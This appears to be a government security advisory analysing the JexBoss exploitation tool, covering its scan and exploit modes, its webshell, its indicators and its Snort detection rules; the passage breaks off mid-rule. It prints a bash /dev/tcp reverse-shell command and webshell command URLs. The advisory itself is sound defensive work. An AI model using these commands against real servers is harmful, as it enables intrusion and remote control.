{
  "markdown": "\nJexBoss\nJexBoss is a tool used to test and exploit vulnerabilities in Java applications and platforms, including the JBoss AS/WildFly web server framework. JexBoss is written in the Python programming language using standard Python libraries. JexBoss is run from the command-line interface (CLI) and operated using a console interface. JexBoss was released as an open-source tool on GitHub in November 2014. JexBoss\u2019 author regularly added new features and exploits until March 2017.\nEarly versions of JexBoss specifically targeted JBoss AS versions 3\u20136. JexBoss has since evolved into a framework that can be used to test and exploit generic Java-related vulnerabilities over HyperText Transfer Protocol (HTTP).\nIn addition to testing JBoss AS for weak default configurations, JexBoss includes exploits for a variety of known vulnerabilities in Java-based frameworks, including some versions of Java Server Faces, Java Seam Framework, Remote Method Invocation over HTTP, Jenkins CLI, Remote Java Management Extension (JMX), and Apache Struts.\nJexBoss also offers attackers the ability to target deserialization vulnerabilities in generic Java applications and servlets by allowing an attacker to specifically target Uniform Resource Locators (URLs) and HTTP POST parameters. This capability can help attackers customize their attacks against their target and exploit zero-day Java deserialization vulnerabilities.\nJexBoss\u2019 ultimate goal is to provide the attacker with a means of executing arbitrary operating system (OS) commands on the target host. This is achieved by using one of the following mechanisms:\n\nInstallation of a webshell \u2013 allows an attacker to submit OS commands to a particular HTTP URL and receive the output of the executed command in the HTTP response.\nBlind command injection \u2013 allows an attacker to submit OS commands as part of a packaged exploit for a specific vulnerability. The command will be executed, but the attacker will not see the output.\nEstablishment of a reverse shell \u2013 both a webshell and a blind command injection can facilitate a third method of executing arbitrary OS commands: the establishment of a reverse shell. In the establishment of a reverse shell, the target initiates a Transmission Control Protocol (TCP) connection with the host and port of the attacker\u2019s choice, after which commands and command outputs are transferred over that new connection.\n\nJBoss AS/WildFly\nJBoss AS/WildFly is a Java-based web server framework that simplifies the process of installing, deploying, and maintaining servlets. JBoss AS was released in 2002 as JBoss AS version 3 and was under continued development until 2012, with the final release of JBoss AS 7.1.1. JBoss AS 7.1.1 was then rebranded under the community project WildFly, which remains under continued development and maintenance. Legacy versions of JBoss AS (particularly versions 6 and older) have unpatched security vulnerabilities because they are no longer maintained. In August 2018, NCCIC\u2019s search via the Shodan search engine showed at least 28,060 web servers running outdated and unsupported JBoss AS software.\nReported Use of JexBoss\nIn March 2016, the Cisco Talos Intelligence Group (Talos) investigated a widespread ransomware campaign known as SamSam, which was targeting the healthcare industry.[1] Talos identified numerous instances where the attackers used JexBoss to gain initial access to the target network through vulnerable versions of JBoss AS. The attackers then moved laterally to reach the intended ransomware targets. This campaign was the first widely reported use of JexBoss.\nThe April 2017 Symantec Internet Security Threat Report documented an intrusion by the Iran-based Chafer espionage group against a target in Turkey. In that intrusion, Chafer used JexBoss to identify and exploit a vulnerable version of JBoss AS, then moved laterally into other computers on the victim\u2019s network.[2]\nThese two instances illustrate threat actors\u2019 use of JexBoss to gain initial access to vulnerable internet-facing versions of JBoss AS. The threat actors leveraged their initial access to move deeper into a victim\u2019s network. The success of these exploits highlight the victims\u2019 weak web server sustainment practices (i.e., failure to upgrade to a more secure version of JBoss AS/Wildfly).\nAlthough more commonly used by threat actors, cybersecurity hunt teams also use JexBoss to evaluate the security of Java web platforms. When a hunt team finds a vulnerable web server, they can leverage JexBoss to pivot into other systems on the target network, which provides a more comprehensive security evaluation.\nExecuting JexBoss\nJexBoss can be run from most standard OSs. To show JexBoss\u2019 interface and analyze the tool\u2019s behavior, NCCIC ran JexBoss from an Ubuntu Linux system against a vulnerable version of JBoss AS 6.1.0 in a secured test environment.\nWhen run without any command-line options, JexBoss\u2019 default behavior is to display a banner followed by a list of command-line option examples that demonstrate different ways to run JexBoss. JexBoss then exits without performing any further actions.\nAn attacker can supply command-line options to JexBoss to alter the tool\u2019s default behavior. A command-line option (hereafter known as an option) modifies the operation of a command. The command\u2019s program determines the effect of the option. Options follow the command name on the command line, separated by spaces. Some options require a value to specify variable parameters.\nJexBoss Modes\nAn attacker can run JexBoss in one of three \u201cmodes:\u201d\n\nStandalone mode \u2013 this is JexBoss\u2019 default mode, used to scan a single target;\nAuto-scan mode \u2013 this mode is used to identify and scan all possible targets in a network; and\nFile-scan mode \u2013 this mode is used to scan targets specified in a file.\n\nEach scan involves the attacker\u2019s computer connecting to the target computer to probe for vulnerabilities that JexBoss has the ability to exploit. After a scan completes, JexBoss will not automatically attempt to exploit a target unless given additional options or instructions.\nStandalone Mode\nThe \u2013mode standalone option instructs JexBoss to run in standalone mode, targeting a single host. Standalone mode is the default mode, so this option may be omitted from the command line.\nStandalone mode requires either the \u2013host HOST or the \u2013u HOST option, the value specifying the target to scan. (The \u2013host HOST and \u2013u HOST options behave identically.) The HOST value indicates the target\u2019s network protocol, host (Internet Protocol [IP] address or domain name), and port. In the example shown in figure 1, JexBoss will scan the target host at IP address 127[.]0[.]0[.]1 using HTTP and TCP port 8080.\nNote: for the remainder of this report, if two options behave identically, they will be shown with a slash (\u201c/\u201d) between them. For example, the -host HOST and -u HOST options will be shown as -host/-u HOST.\n\nFigure 1: JexBoss screenshot \u2013 specify target on the command-line\nNote: all JexBoss screenshots in this report show JexBoss in standalone mode.\nAuto-Scan Mode\nThe -mode auto-scan option instructs JexBoss to use auto-scan mode to identify and scan multiple hosts in a network block. This mode makes use of additional options:\n\n-network NETWORK,\n-ports PORTS, and\n-results LOGFILENAME.\n\nNETWORK must be a block of IP addresses in Classless Internet Domain Routing notation. If this option is omitted, JexBoss will scan the /16 network block of the attacking computer\u2019s primary network interface. PORTS must be a comma-separated list of TCP ports. If this option is omitted, JexBoss will scan each IP address for TCP ports 80 and 8080, the standard HTTP ports.\nJexBoss will scan the target block of IP addresses by attempting to connect to each IP address within the network block on each target TCP port. The results of the scan are written to the LOGFILENAME file, or jexboss_auto_scan_results.log if the -results option is omitted.\nFile-Scan Mode\nThe -mode file-scan option instructs JexBoss to use file-scan mode to scan multiple hosts specified in a file. This mode makes use of two additional options:\n\n-file FILENAME, and\n-out LOGFILENAME.\n\nThe -file option is required for file-scan mode. The contents of the FILENAME file must be a list of targets, one per line, in the same format as required by the -host/-u HOST option. JexBoss will attempt to scan each target specified in the FILENAME file. The results of the scan are written to the LOGFILENAME file, or to jexboss_file_scan_results.log if the -out option is omitted.\nJexBoss Vulnerability Scan\nJexBoss scans targets to test whether they are vulnerable to several known exploits (e.g., weak authentication, Java object deserialization flaws). JexBoss then displays a report with the test results, indicating whether the tested components are exposed, vulnerable, or secured (the indicator for a secured component is \u201cOK\u201d).\nThe results shown in figure 2 indicate that the JBoss admin-console is exposed (i.e., reachable by the attacker) and that the JBoss AS jmx-console and JMXInvokerServlet components are vulnerable to exploitation. The results identify the other applications and frameworks as safe from the JexBoss exploits.\n\nFigure 2: JexBoss screenshot \u2013 vulnerability test results\nNote: in a properly managed JBoss AS deployment, the admin-console should not be reachable from the internet; it should only be reachable from trusted internal hosts. However, even if an admin-console is only reachable from trusted internal hosts, dedicated attackers may be able to gain access to those internal hosts and attack the JBoss AS deployment from there.\nJexBoss Exploitation\nAfter scanning, JexBoss may perform exploitation of identified vulnerabilities depending upon the mode and options chosen.\nWhen run in standalone mode, JexBoss will display the results of the scan as shown in figure 2 by default. JexBoss will then enter an interactive mode that asks the attacker for input. As shown in figure 3, JexBoss will ask the attacker whether it should try to run an automated exploitation of a specific vulnerability.\n\nFigure 3: JexBoss screenshot \u2013 JexBoss asks permission to continue\nIf the attacker answers yes, JexBoss will attempt to exploit the vulnerability in admin-console.\nFigure 4 illustrates JexBoss targeting the admin-console component to determine if the JBoss AS platform is configured with the default administrator username and password\u2014which would be the case for an improperly managed JBoss AS deployment. In the exploit attempt shown in figure 4, JexBoss is attempting to log in to JBoss AS with default credentials. Alternatively, the attacker can specify the credentials JexBoss should attempt to use for the login, by using the -J/--jboss-login options.\n\nFigure 4: JexBoss screenshot \u2013 interactive exploitation of the admin-console\nFigure 4 indicates success for several phases of the exploit attempt. These phases are listed below.\n\nDelivery: JexBoss attempted login with default credentials; this attempt was sent to the JBoss AS admin-console.\n\nThe success of this attempt is indicated by the phrase: \u201cTrying to perform authentication with default credentials\u201d.\n\n\nExploitation: JexBoss successfully logged in with default credentials.\n\nThe success of this attempt is indicated by the phrase: \u201cSuccessfully logged in!\u201d\n\n\nInstallation: JexBoss successfully deployed the webshell code.\n\nThe success of this attempt is indicated by the phrase: \u201cSuccessfully deployed code!\u201d\n\n\nCommand and Control (C2): JexBoss successfully executed OS commands.\n\nThe success of this attempt is indicated by the output of the uname -a command, which starts with \u201cLinux 2f8c3354a075 4.13.0-38\u201d.\n\n\nAction on Objectives: JexBoss successfully attempted this phase, as evident by the presence of the Shell> prompt.\n\nThe success of this attempt is indicated by the presence of the Shell> prompt. The attacker can use the interactive Shell> prompt to access the JexBoss webshell to execute OS commands and see the command output.\n\n\n\nAutomated Exploitation\nThe auto-scan and file-scan modes of JexBoss will, by default, only perform the vulnerability scan and report the results. To exploit vulnerabilities when using these modes, the attacker must specify the -A/--auto-exploit option. The -A/--auto-exploit option can also be used in standalone mode, which will remove the yes or no questions asking whether to run automated exploitation, as well as the access to the webshell via the Shell> prompt.\nWebshell Installation\nJexBoss can use a number of different exploits to attempt to install the JexBoss webshell (e.g., exploitation of the JMX console). Once installed, the webshell grants the attacker the ability to execute OS commands remotely by accessing the webshell URL over HTTP or HTTP Secure (HTTPS). The webshell also enables the attacker to receive the command output in response. See the Webshell Analysis section for a description of the JexBoss webshell\u2019s capabilities.\nJexBoss will attempt to exploit the vulnerable component to upload the webshell code over the HTTP session and install the webshell into the web server. If this is not successful\u2014and depending upon the vulnerability\u2014JexBoss may attempt to exploit the vulnerability to induce the web server to download and install the webshell from the internet.When used in standalone mode, JexBoss allows the attacker to use the webshell through the interactive Shell> prompt by default, as shown in figure 4.\nBlind Command Injection\nIn cases where the installation of the webshell fails or is not possible, such as with application Java deserialization vulnerabilities, JexBoss will attempt to perform a blind command injection. A blind command injection sends a payload\u2014created by the attacker, and which includes an OS command\u2014to the vulnerable component. The vulnerable component processes the payload insecurely and executes the embedded OS command. After the embedded OS command is executed, the output of this execution is not returned to the attacker; therefore, the command injection occurs \u201cblindly.\u201d The attacker can only determine whether the command was executed successfully by observing the effects of the command execution.\nJexBoss automates the creation and delivery of the payload. When attempting a blind command injection, the default OS command JexBoss packages in the payload is a Linux-specific command to create a reverse shell (see the Reverse Shell section).\nAlternatively, the attacker can specify a different OS command to be executed using the --cmd CMD option. As shown in figure 5, the CMD value is the alternate OS command.\nNote: using the --cmd option in the auto-scan and file-scan modes requires using the -A/--auto-exploit option, otherwise the --cmd option will be ignored.\n\nFigure 5: Specifying injected OS command with the --cmd option\nIn addition to the exploits against the vulnerable Java-based applications and frameworks shown in figure 2, JexBoss also supports the exploitation of arbitrary Java deserialization vulnerabilities with blind command injection attacks. To accomplish this, the attacker supplies a URL with the -host/-u option, an application parameter into which the payload will be injected with the -H/--post-parameter PARAMETER option, and the -j/--app-unserialize option.\nReverse Shell\nA reverse shell is a common technique attackers use to execute commands interactively\u2014with keyboard input and text output\u2014through the target system\u2019s built-in command-line programs. JexBoss relays the input and output of the command-line program\u2014usually through the Bash command language interpreter on Linux targets and cmd.exe on Windows targets\u2014through a TCP connection initiated by the target to an IP address and a port of the attacker\u2019s choosing.\nThe JexBoss webshell includes the capability to establish a reverse shell. If the attacker issues the jexremote=IP:PORT command to the webshell, the webshell will initiate a connection to the specified IP address and TCP port using Java\u2019s Socket class and relay OS commands to and output from the command-line program through that connection. An example of the jexremote command is shown in figure 4.\nEstablishing a reverse shell can also be performed using blind command injection. The default OS command JexBoss packages in the exploit payload to create a reverse shell is\n/bin/bash \u2013i > /dev/tcp/IP/PORT 0&>1 2>&1\n(where IP and PORT are specified by the attacker). This command redirects the standard input and output of the Bash shell through the victim Linux kernel\u2019s built-in TCP device. For blind command injection, JexBoss obtains the IP and PORT values either from the values supplied in the -r/--reverse-host RHOST:RPORT option, or by prompting the attacker for those values, as shown in figure 6.\n\nFigure 6: JexBoss screenshot \u2013 JexBoss obtaining the IP and PORT for the reverse shell\nTo establish the TCP connection for the reverse shell, the computer with the IP address specified by the attacker must listen for connections on the specified TCP port. The program that listens for these connections must be able to accept user command-line input and display text output.\nA common tool used to listen for reverse shell connections is Netcat. Figure 7 shows Netcat being used to listen for incoming connections on TCP port 4444. After the reverse shell is established, Netcat shows the shell prompt. The attacker then uses the reverse shell to display the /etc/passwd file to get a listing of user accounts on the target.\n\nFigure 7: JexBoss screenshot - reverse shell using a Netcat listener\nAttackers often use tools that are more sophisticated than Netcat, such as Meterpreter, to listen for reverse shell connections and control the reverse shell.\nObservable Network Behavior\nSecurity analysts can observe JexBoss\u2019 behavior through passive network traffic monitoring. The observable content depends upon the location of the organization\u2019s network traffic monitoring sensor. Communication between the attacker and the target can be observed at any in-line point\u2014on either the attacker\u2019s local network or the target\u2019s local network. Figure 8 shows an organization\u2019s typical network sensor architecture, including a passive sensor monitoring the packets traversing the organization\u2019s primary ingress and egress points.\n\nFigure 8: Typical organization's network sensor location\nVersion Checks\nUpon its initial execution in any of the scan modes, JexBoss will attempt to retrieve its version information from the internet by reaching out to the following URL:\nhxxp[:]//joaomatosf.com/rnp/releases.txt\nNote: all URLs have been modified to prevent unintentional access.\nIf the version of JexBoss being used is not the latest version, the attacker will see a message recommending an upgrade.\nSome versions of the JexBoss webshell include a version check function, which can determine if the webshell being used is the latest version. The target computer will retrieve the latest available webshell version number from the following URL:\nhxxp[:]//webshell.jexboss.net/jsp_version.txt.\nIf the installed webshell is not the latest available version, the attacker will see an HTTP response that includes a message recommending the webshell be upgraded, once the attacker accesses the webshell.\nNote: both of the JexBoss version checks detailed above will be evident to an affected organization. The organization will be able to see a lookup of the joaomatosf.com or webshell.jexboss.net domains in their Domain Name System (DNS) queries. These URLs will also be present in the organization\u2019s HTTP traffic. When these artifacts are found on an organization\u2019s network, they indicate JexBoss is present, which is a potential security risk and should be investigated.\nThe attacker using JexBoss can disable both version checks by using the -D/--disable-check-updates option.\nWebshell Download\nIf the installation of the JexBoss webshell fails, JexBoss may attempt to induce the target server to download and install the JexBoss webshell from the internet at the following URL:\nhxxp[:]//www.joaomatosf.com/rnp/jexws4.war\nIf the hxxp[:]//www.joaomatosf.com/rnp/jexws4.war domain or URL is present in an organization\u2019s DNS and HTTP logs, this indicates the JexBoss webshell may be present on the organization\u2019s network. Any organization that identifies this activity should investigate it.\nNote: the filename of the webshell downloaded may change. The public webshell files on hxxp[:]//www.joaomatosf.com reveal multiple jexws*.war files, all of which have basically the same content, but with different MD5 checksums. Using different MD5 checksums allows older versions of JexBoss to induce the web server to download the latest version of the webshell.\nAttack Communication Parameters\nCommunications between the attacker and target occur over HTTP or HTTPS, depending upon the target\u2019s web server configuration. HTTPS communications\u2014typically over TCP port 443 or 8443\u2014are encrypted. Organizations that use reverse proxies or some configurations of web application firewalls may be able to observe decrypted network traffic between the perimeter device and the web server. Otherwise, the signs of an attack over HTTPS will only be observable in network appliance logs or on the web server itself.\nNote: for the remainder of this report, unless otherwise noted, network traffic is assumed to be unencrypted HTTP, typically over port 80 or 8080.\nWhen JexBoss starts, it randomly selects one User-Agent header value from the list in table 1 to use for all HTTP requests to the target web server. The User-Agent values listed in table 1 are legitimate, helping JexBoss traffic blend in with legitimate HTTP traffic. However, they are also dated, which may help organizations differentiate them from normal HTTP traffic.\n\n\nTable 1: JexBoss User-Agent header value choices\n\n\n\nHTTP User-Agent Header Value Choices\n\n\n\n\nMozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0\n\n\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\n\n\nMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n\n\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9\n\n\nMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36\n\n\nMozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0\n\n\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\n\n\nMozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)\n\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\n\n\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0\n\n\nMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\n\n\nOpera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17\n\n\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\n\n\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\n\n\n\nBecause JexBoss is written in Python, it is easy for sophisticated attackers to alter some of the static data sent to the target web server\u2014including the User-Agent header value choices and parts of the exploits themselves\u2014which would make signature-based detection ineffective.\nAttack Phases\nNCCIC has assessed that JexBoss operates at all seven steps in the Cyber Kill Chain framework. Due to the nature of the vulnerabilities and how they are exploited, JexBoss combines some of the steps, resulting in three high-level phases:\n\nPhase 1: Reconnaissance;\nPhase 2: Weaponization, Delivery, Exploitation, and Installation; and\nPhase 3: C2 and Action on Objectives.\n\nPhase 1: Reconnaissance\nIn Phase 1, JexBoss determines which componentsof the target web server, if any, are exposed and vulnerable. JexBoss connects to the target web server multiple times and makes multiple HTTP requests\u2014using the GET and HEAD methods\u2014to gather this information (see figure 9).\n\nFigure 9 : Typical Uniform Resource Identifier (URI) probe\nAside from the references to JexBoss in some URLs, most of these requests look legitimate or benign, with one notable exception, shown in figure 10.\n\nFigure 10: JexBoss-specific Apache Struts 2 probe\nThe HTTP request shown in figure 10 almost exactly matches the exploit of the Apache Struts 2 vulnerability (CVE-2017-5638) published by Vex Woo in March 2017.[3]\u00a0However, JexBoss customizes two parts of this snippet by using #gift and #giftarray\u2014instead of #cmd and #cmds\u2014and by using jexboss as the command, which uniquely identifies the activity as being related to JexBoss.\nNote: the HTTP request shown in figure 10 attempts to exploit the Apache Struts 2 vulnerability; however, there is no command execution in this phase\u2014JexBoss is only trying to determine if an exploit is possible.\nNetwork defenders can deploy intrusion detection system (IDS) signatures\u2014such as those found in the Network IDS and IPS Signatures section\u2014to detect JexBoss\u2019 initial reconnaissance activity. However, some of these signatures will fire on attempted exploits, not just successful exploits, which limits their value to the defender.\nPhase 2: Weaponization, Delivery, Exploitation, and Installation\nJexBoss weaponizes exploits in different ways, depending upon the vulnerability being exploited. For example, to exploit the Apache Struts 2 vulnerability (CVE-2017-5638), JexBoss packages the exploit and the OS command to run in the Content-Type HTTP header value that will be delivered to the target web server in a HTTP GET request (see figure 10).\nJexBoss delivers exploits to the target web server over HTTP using GET or POST requests for URIs and data specific to the vulnerabilities.\nThe exploits JexBoss uses are vulnerability-specific. For example, the attack against the admin-console exploits weak configurations of JBoss AS by simply attempting to log in with a username and password. Other attacks attempt to exploit Java deserialization vulnerabilities to install the JexBoss webshell or to execute OS commands.\nFigure 11 shows an example of the weaponization of the JexBoss webshell delivered as a URI query parameter in an HTTP HEAD request, exploiting a vulnerability in the JMX Console (a component of JBoss AS). If this exploit is successful, the victim web server will install the JexBoss webshell.\n\nFigure 11: Example of JexBoss webshell in URI query parameter\nThe packet dump shown in figure 12 is an example of the JexBoss webshell weaponized as a Java serialized object delivered to the JMX Invoker Servlet\u2014another component of JBoss AS\u2014in an HTTP POST request. The serialized object in this example (figure 11) begins with the bytes \\xAC\\xED at byte position 0x01c4\u2014452 bytes into the HTTP request.\n\nFigure 12: Example of JexBoss webshell packaged in a Java serialized object\nTo test whether the installation of the webshell has succeeded, JexBoss will submit an HTTP GET request to the target web server for one of the following URLs:\n\nhxxp[:]//victim/jexws4/jexws4.jsp, or\nhxxp[:]//victim/jexinv4/jexinv4.jsp.\n\nPacket number 22 in figure 13 indicates the test for successful webshell installation. Packet number 24, the HTTP response to packet number 22, is an HTTP 200 OK message that indicates the webshell installation was successful. An HTTP 404 Not Found message in response indicates that the webshell installation failed.\n\nFigure 13: JexBoss webshell access packet list\nPhase 3: C2 and Actions on Objectives\nIf JexBoss succeeds in installing the JexBoss webshell on the victim web server, the webshell will allow the attacker to issue OS commands for execution through HTTP GET requests as follows:\nhxxp[:]//victim/jexws4/jexws4.jsp?ppp=<url-encoded-OS-command>\nFor example, the packet contents displayed in figure 14 show that the attacker issued the id OS command to the webshell. In figure 14, the victim web server provided the OS command execution output in the HTTP response.\n\nFigure 14: JexBoss webshell command HTTP contents\nWhen JexBoss is run in standalone mode, JexBoss will issue three specific commands\u2014after the successful installation of the webshell\u2014sequentially upon initial exploitation of a Linux server. These commands are listed in table 2.\n\n\nTable 2: JexBoss' default initial Linux commands\n\n\n\nCommand\nDescription of Action\n\n\nuname -a\nRetrieves host information\n\n\ncat /etc/issue\nRetrieves Linux OS information\n\n\nid\nDetermines the user under which commands will run\n\n\n\nSecurity analysts can observe the attempted execution of these three commands in web server logs, even if the HTTP communication is encrypted with Transport Layer Security or Secure Sockets Layer. Analyzing web server logs for this activity is an additional way organizations can confirm the presence of JexBoss.\nFor vulnerabilities exploited through blind command injection, there is no installation step. JexBoss achieves the Cyber Kill Chain steps C2 and Actions on Objectives (i.e., Phase 3 in the Attack Phases section) by packaging OS commands directly in the exploit payload and delivering the payload to the vulnerable component; therefore, there is no distinction between Phase 2 and Phase 3 in blind command injection.\nThe partial packet hexdump shown in figure 15 is an example of the C2 step with blind command injection. In this example, JexBoss packages and delivers an OS command that attempts to establish a reverse shell, described in the Reverse Shell section.\n\nFigure 15: KexBoss packet hexdump including reverse shell OS command\nWhile a reverse webshell can help attackers achieve C2, it is also easy to detect. An organization\u2019s network web servers do not typically make outbound connections to arbitrary internet hosts; therefore, connections like these would be a red flag for network defenders. In the network capture shown in figure 16, the victim server has established a connection back to the attacker\u2019s system via TCP port 4444.\n\nFigure 16: JexBoss reverse webshell establishment packet list\nAn unusual outbound connection\u2014like the one illustrated in figure 16\u2014would stand out to an experienced network defender; the network defender\u2019s awareness of the anomalous behavior increases the attacker\u2019s risk of detection. Many organizations choose to filter outbound connections, which would stop an attempt like the one illustrated in figure 16.\nAttackers can execute JexBoss commands without a webshell or reverse webshell by using the --cmd option, as described in the Blind Command Injection section. A clever attacker could issue commands to perform complex tasks and exfiltrate data. For example, the attacker may create a script that collects data and sends it to another location on the victim network for later retrieval.\nWebshell Analysis\nIf the JexBoss webshell is installed on the victim web server, JexBoss can access the webshell by issuing HTTP GET requests to the appropriate .jsp file (e.g., jexws4/jexws4.jsp), using the optional ppp query parameter, the value of which is used as the OS command to execute on the victim web server.\nThere are three main versions of the JexBoss webshell: the original version (November 30, 2014), version 2 (April 23, 2016), and version 4 (the current version). Each time a subsequent JexBoss version is created, the new version can be considered an upgrade over the previous version and offering additional capabilities, as described in table 3.\n\n\nTable 3: JexBoss webshell functionality by version\n\n\n\nWebshell Version\nFunctionality\n\n\nOriginal (November 30, 2014)\n\n\nExecutes OS commands specified in the ppp HTTP query parameter using Java\u2019s Runtime.exec() method and returns the output of the command execution in the HTTP response\nRequires the User-Agent: jexboss HTTP header\n\n\n\n\nVersion 2 (April 23, 2016)\n\n\nChecks the webshell version if the check-updates HTTP header value is not set to false (see the Version Checks section)\nDoes not require the User-Agent: jexboss HTTP header\nExecutes OS command using Java\u2019s Runtime.exec() method\n\nUses cmd.exe /C for Windows OSs\nUses /bin/bash -c for non-Windows OSs\n\n\n\n\n\n\nVersion 4 (Current)\n\n\nIf the ppp HTTP query parameter is not specified, checks for the X-JEX HTTP header and, if present, uses the value of that header as the OS command\nIf the OS command is in the format jexremote=IP:PORT, establishes a reverse shell (using cmd.exe or /bin/bash, depending upon the web server OS) with the specified IP address and port using Java\u2019s Socket class\n\n\n\n\n\nJexBoss webshell version 2 is the latest version available on GitHub, as described in the Version Checks section. This version check uses a User-Agent HTTP header value that includes information about the attacker\u2019s webshell access: the host HTTP header value and the IP address of the attacker host. This collection of host and IP information indicates that JexBoss\u2019 author may leverage attackers\u2019 use of the tool to collect a list of attacking IPs and exploited servers.\nThe latest version of the webshell available on joaomatosf[.]com is version 4. At the time of this report\u2019s publication, NCCIC has been unable to acquire version 3 for analysis.\n\nSummary\n\nJBoss Verify and EXploitation tool (JexBoss) is an open-source tool used by cybersecurity hunt teams (sometimes referred to as \u201cred teams\u201d) and auditors to conduct authorized security assessments. Threat actors use this tool maliciously to test and exploit vulnerabilities in JBoss Application Server (JBoss AS)\u2014now WildFly\u2014and a variety of Java applications and platforms. JexBoss automates all the phases of a cyberattack, making it a powerful and easy-to-use weapon in a threat actor\u2019s cyber arsenal.\nThis report provides a detailed analysis of JexBoss\u2019 functionality, along with detection, response, prevention, and mitigation recommendations.\n\nSolution\n\nNCCIC recommends a defense-in-depth approach to mitigating the risks of JexBoss.\nBest Practices\nThe best way to defend against JexBoss is to ensure that servers are not vulnerable to the exploits it uses. The vulnerabilities exploited by JexBoss can also be exploited by other tools. Once an organization has remediated the vulnerabilities associated with JexBoss, the organization\u2019s servers will be less prone to other tools that leverage the same exploits.\nBest practices include\n\nKeeping OSs, web servers, and applications up-to-date;\nSecuring access to administrative consoles;\nUsing non-privileged accounts with limited capabilities to run servers;\nReviewing server logs to identify indications of a successful compromise; and\nFrequently testing organization systems and applications for the latest vulnerabilities via automated vulnerability scans.\n\nBecause JBoss AS is no longer supported by the vendor, organizations using JBoss AS should migrate their existing JBoss AS instances to the supported equivalent, such as WildFly or the JBoss Enterprise Application Platform. Because JexBoss can be used to exploit a variety of other Java-based frameworks (e.g., Apache Struts, Java Server Faces, Jenkins), users should keep these frameworks updated, or remove them if they are not necessary.\nDetection Strategies\nAn organization\u2019s security operations team can monitor for attempted and successful JexBoss exploit attacks using a variety of methods. NCCIC recommends the following detection strategies:\n\nUpdate network IDS and IPS signatures.\nAnalyze behavioral indicators.\nAnalyze on-server artifacts.\n\nNetwork IDS and IPS Signatures\nMany organizations deploy Snort or Suricata IDSs in commercial appliances\u2014or as standalone platforms on commodity hardware\u2014and leverage signatures written by Snort, Emerging Threats, and others in the cybersecurity community. Tables 4 and 5 provide signatures developed by NCCIC and other organizations. Signatures that were created by outside organizations reference the appropriate signature identifier.\nNCCIC assesses the Snort rules in table 4 to be high-confidence indicators of potentially dangerous JexBoss webshell network behavior.\n\n\nTable 4: JexBoss webshell Snort signatures/rules\n\n\n\n#\nJexBoss Behavior\nDetection Signature/Rule\n\n\n1\nAttempts to issue a command to the JexBoss webshell with the ppp query parameter\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:\"JexBoss webshell command ppp submission\"; flow:established,to_server; content:\".jsp?ppp=\"; http_uri; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n2\nAttempts to issue a command to the JexBoss webshell with the X-JEX HTTP header field\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:\"JexBoss webshell command X-JEX submission\"; flow:established,to_server; content:\"X-JEX\"; http_header; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n3\nAttempts by the successfully exploited server to download the JexBoss webshell from the internet\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"JexBoss webshell download\"; flow:established,to_server; content:\"rnp/jexws4.war\"; http_uri; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n4\nCDNS queries for the JexBoss webshell version check and alternate download location\nalert udp $HOME_NET any -> any 53 (msg:\"DNS query for JexBoss alternate domain\"; flow:to_server; byte_test:1,!&,0xF8,2; content:\"|08|webshell|07|jexboss|03|net|00|\"; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n\nWhen run against real-world network traffic, NCCIC generated alerts for rule 1 in table 4 above. The URI pattern for these alerts was /jexinv4/jexinv4.jsp?ppp=<cmd>, where <cmd> was a long Linux command that tried to induce the server to download and execute a Linux webshell script from an internet location. This attempt to access the JexBoss webshell was one of several unrelated HTTP requests from the same source IP to the same target IP, likely indicating scanning activity to determine if the server was already compromised by any of a number of tools, including JexBoss.\nAs noted in the Attacker to Victim Network Behavior section, an HTTP 200 OK message response from the server would indicate that the webshell was installed on the server. However, the response observed in the NCCIC environment was an HTTP 302 Redirect message, which instructed the client to repeat the request of HTTPS. NCCIC did not observe any such HTTPS traffic. Most likely the presumed scanning tool used to generate the HTTP traffic was not able to properly handle the HTTP 302 response.\nTable 5 provides the Snort rules that indicate JexBoss activity but do not necessarily indicate successful JexBoss exploitation. Rule 5 in table 5 below, alerts on traffic to the JexBoss author\u2019s domain, which\u2014in addition to JexBoss webshells\u2014contains non-JexBoss content.\n\n\nTable 5: Snort signatures identifying JexBoss attempts\n\n\n\n#\nNetwork Activity\nDetection Signature\n\n\n1\nDNS queries for the JexBoss author\u2019s domain\nalert udp $HOME_NET any -> any 53 (msg:\"DNS query for JexBoss author domain joaomatosf.com\"; flow:to_server; byte_test:1,!&,0xF8,2; content:\"|0A|joaomatosf|03|com|00|\"; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n2\nDetects the JexBoss-specific probe of the Apache Struts 2 vulnerability (CVE-2017-5638)\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any 